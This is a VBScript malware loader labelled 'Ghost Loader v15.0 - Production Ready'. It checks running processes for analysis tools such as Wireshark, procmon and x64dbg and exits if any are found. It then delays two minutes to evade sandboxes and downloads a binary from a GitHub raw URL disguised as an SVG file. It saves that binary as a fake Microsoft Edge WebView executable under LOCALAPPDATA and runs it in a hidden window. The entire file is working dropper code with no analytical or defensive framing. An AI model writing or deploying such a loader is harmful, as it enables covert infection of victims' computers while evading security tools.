' Ghost Loader v15.0 - Production Ready
' Relaxed sandbox checks for real-world deployment
Option Explicit
On Error Resume Next

' ==================== CONFIG ====================
Const DELAY_SECONDS = 120        ' 2 minutes delay

' ==================== OBJECTS ====================
Dim ws, fs
Set ws = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

' ==================== LIGHT SANDBOX CHECK ====================
Function IsAnalysis()
    IsAnalysis = False
    
    ' Only check for obvious analysis tools
    Dim procs, proc
    Set procs = GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT Name FROM Win32_Process")
    For Each proc In procs
        Dim pName
        pName = LCase(proc.Name)
        If InStr(pName, "wireshark") > 0 Or InStr(pName, "procmon") > 0 Or InStr(pName, "procexp") > 0 Or InStr(pName, "fiddler") > 0 Or InStr(pName, "x64dbg") > 0 Or InStr(pName, "ollydbg") > 0 Then
            IsAnalysis = True
            Exit Function
        End If
    Next
End Function

' ==================== DELAY WITH ACTIVITY ====================
Sub DelayedStart()
    Dim i
    For i = 1 To DELAY_SECONDS
        WScript.Sleep 1000
        ' Light activity
        If i Mod 60 = 0 Then
            Dim d
            d = Now
        End If
    Next
End Sub

' ==================== MAIN ====================
Sub Main()
    ' Skip if analysis tools detected
    If IsAnalysis() Then
        WScript.Quit
    End If
    
    ' Wait
    DelayedStart
    
    ' Download and execute
    Dim url, destDir, destPath
    Dim xhr, stm
    
    url = "https://raw.githubusercontent.com/sophieduval/der/main/logo.svg"
    destDir = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\EdgeWebView"
    
    If Not fs.FolderExists(destDir) Then
        fs.CreateFolder destDir
    End If
    destDir = destDir & "\Application"
    If Not fs.FolderExists(destDir) Then
        fs.CreateFolder destDir
    End If
    
    destPath = destDir & "\msedgewebview2.exe"
    
    Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xhr.SetTimeouts 60000, 60000, 60000, 60000
    xhr.Open "GET", url, False
    xhr.Send
    
    If xhr.Status = 200 Then
        Set stm = CreateObject("ADODB.Stream")
        stm.Type = 1
        stm.Open
        stm.Write xhr.responseBody
        stm.SaveToFile destPath, 2
        stm.Close
        Set stm = Nothing
        
        If fs.FileExists(destPath) Then
            ws.Run """" & destPath & """", 0, False
        End If
    End If
    
    Set xhr = Nothing
End Sub

Main

Set ws = Nothing
Set fs = Nothing
